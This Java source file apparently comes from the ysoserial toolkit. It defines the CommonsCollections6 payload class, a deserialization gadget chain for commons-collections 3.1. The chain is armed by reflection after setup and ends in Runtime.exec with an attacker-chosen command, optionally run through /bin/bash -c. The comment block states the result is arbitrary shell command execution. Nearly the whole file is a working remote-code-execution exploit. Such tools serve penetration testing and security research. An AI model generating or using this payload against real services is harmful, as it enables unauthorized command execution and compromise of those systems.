package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

import javax.management.MXBean;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.ListOrderedMap;

import ysoserial.annotation.Bind;
import ysoserial.interfaces.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
Gadget chain:	
	ObjectInputStream.readObject()
		AnnotationInvocationHandler.readObject()
			Map(Proxy).entrySet()
				ListOrderedMap.EntrySetView.iterator()
					ListOrderedMap.ListOrderedIterator.next()
					ListOrderedMap.ListOrderedMapEntry.value()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()				
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()							

Requires:
	commons-collections

Result:
	Arbitrary shell command executed

 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<InvocationHandler> {

	@Bind private String command;
	@Bind( defaultValue = "false" ) private boolean useShell;
	@Bind( defaultValue = "/bin/bash" ) private String shell;
	@Bind( defaultValue = "-c" ) private String shellParam;
	
	public InvocationHandler getObject() throws Exception {
		String[][] execArgs = new String[][] { { command } };
		
		if ( useShell ) { 
			execArgs = new String[][] { { shell, shellParam, command } };
		}
		
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
			new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] {
					String.class, Class[].class }, new Object[] {
					"getRuntime", new Class[0] }),
				new InvokerTransformer("invoke", new Class[] {
					Object.class, Object[].class }, new Object[] {
					null, new Object[0] }),
				useShell ? new InvokerTransformer("exec",
					new Class[] { String[].class }, execArgs) : 
						new InvokerTransformer("exec",
							new Class[] { String.class }, execArgs[0] ),
				new ConstantTransformer(1) };

		final Map innerMap = new HashMap();		
		innerMap.put( "3", "x" );
		innerMap.put( "4", "y" );
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		final Map lomMap = ListOrderedMap.decorate( lazyMap );

		ArrayList lomInsert = new ArrayList();
		lomInsert.add( "value" );
		Reflections.setFieldValue( lomMap, "insertOrder", lomInsert);

		final InvocationHandler handler = createMemoizedInvocationHandler(lomMap);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	

		return handler;
	}

	public InvocationHandler getObject(String command) throws Exception {
		throw new UnsupportedOperationException( "Use the no-args bind version" );
	}

	public static InvocationHandler createMemoizedInvocationHandler(Map<String, Object> map) throws Exception {
		return (InvocationHandler)Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(new Object[] { MXBean.class, map });
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections6.class, args );
	}
}